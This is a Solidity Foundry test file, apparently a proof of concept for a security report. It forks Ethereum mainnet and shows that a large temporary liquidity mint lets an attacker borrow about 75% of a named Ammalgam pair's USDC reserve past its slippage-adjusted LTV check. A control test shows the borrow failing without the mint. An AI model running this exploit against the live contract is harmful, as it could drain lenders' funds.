// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IWETH {
    function deposit() external payable;
}

/// @dev Demonstrate flash-LP bypass of increaseForSlippage while raw TWAP LTV stays healthy.
contract FlashLpLtvBypassTest is Test {
    address constant PAIR = 0x728fD0A966B993fe518B00122D51e494F99aBd6a;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IAmmalgamPair pair = IAmmalgamPair(PAIR);

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://rpc.mevblocker.io")));
    }

    /// Control: same borrow + oversized collateral still fails without flash LP (slippage).
    function test_borrowFailsWithoutFlashLp_dueToSlippage() public {
        address attacker = makeAddr("attackerCtrl");
        (uint112 reserveX, uint112 reserveY,) = pair.getReserves();

        // Borrow ~75% of X reserve — L*D/(L-D) ≈ 3x debt, blows past 75% LTV without flash LP.
        uint256 borrowUsdc = uint256(reserveX) * 75 / 100;
        // ~2.5x borrow value in Y so raw TWAP LTV stays under 75% once slippage is removed.
        uint256 collateralWeth = (uint256(reserveY) * borrowUsdc / uint256(reserveX)) * 250 / 100;

        _setupCollateral(attacker, collateralWeth);

        vm.prank(attacker);
        vm.expectRevert();
        pair.borrow(attacker, borrowUsdc, 0, "");
    }

    function test_flashLpBypassesSlippageThenBurnLeavesDebt() public {
        address attacker = makeAddr("attacker");
        address helper = makeAddr("helper");
        (uint112 reserveX, uint112 reserveY,) = pair.getReserves();

        uint256 borrowUsdc = uint256(reserveX) * 75 / 100;
        uint256 collateralWeth = (uint256(reserveY) * borrowUsdc / uint256(reserveX)) * 250 / 100;

        uint256 flashX = uint256(reserveX) * 20;
        uint256 flashY = uint256(reserveY) * 20;

        _fundUsdc(helper, flashX);
        _fundWeth(helper, flashY);
        _setupCollateral(attacker, collateralWeth);

        // Inflate ALA via third-party mint
        vm.startPrank(helper);
        IERC20(USDC).transfer(PAIR, flashX);
        IERC20(WETH).transfer(PAIR, flashY);
        uint256 lp = pair.mint(helper);
        vm.stopPrank();
        console2.log("flash LP", lp);

        uint256 before = IERC20(USDC).balanceOf(attacker);
        vm.prank(attacker);
        pair.borrow(attacker, borrowUsdc, 0, "");
        uint256 gained = IERC20(USDC).balanceOf(attacker) - before;
        console2.log("borrowed USDC", gained);
        assertEq(gained, borrowUsdc);

        // Remove flash depth
        vm.startPrank(helper);
        IERC20(pair.tokens(0)).transfer(PAIR, lp);
        pair.burn(helper);
        vm.stopPrank();

        (uint112 rx,,) = pair.getReserves();
        address bx = pair.tokens(4);
        console2.log("reserveX after", rx);
        console2.log("debt shares left", IERC20(bx).balanceOf(attacker));
        assertGt(IERC20(bx).balanceOf(attacker), 0);
        // Utilization of X vs post-burn reserves is high
        assertGt(borrowUsdc * 100 / uint256(rx), 40, "material X utilization remains after flash burn");
    }

    function _setupCollateral(address who, uint256 wethAmt) internal {
        _fundWeth(who, wethAmt);
        vm.startPrank(who);
        IERC20(WETH).transfer(PAIR, wethAmt);
        pair.deposit(who);
        vm.stopPrank();
    }

    function _fundWeth(address to, uint256 amount) internal {
        vm.deal(to, amount);
        vm.prank(to);
        IWETH(WETH).deposit{value: amount}();
    }

    function _fundUsdc(address to, uint256 amount) internal {
        deal(USDC, to, amount);
    }
}
